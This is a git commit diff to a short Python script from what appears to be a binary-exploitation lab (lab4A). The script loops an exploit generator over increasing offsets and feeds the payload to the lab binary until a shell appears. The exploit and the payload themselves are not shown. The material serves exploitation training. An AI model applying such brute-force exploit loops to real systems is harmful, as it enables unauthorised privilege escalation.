7efd8c48193a7fdaa200fb0600ca9980196fa38d
ngovinhhuy <31349426+ngovinhhuy@users.noreply.github.com>
2021-10-25 16:21:18 +0700

    Update 4A_offset_brute.py

--- lab4/lab4A/4A_offset_brute.py
+++ lab4/lab4A/4A_offset_brute.py
@@ -1,6 +1,6 @@
 import os
 i=0
 while True: #Run until we get shell,press Ctrl+Z to exit
-        os.system("python3 /tmp/4A_exploit.py {}".format(i))
+        os.system("python3 4A_exploit.py {}".format(i))
         os.system("/levels/lab04/lab4A $(cat /tmp/4A_payload)")
         i+=1
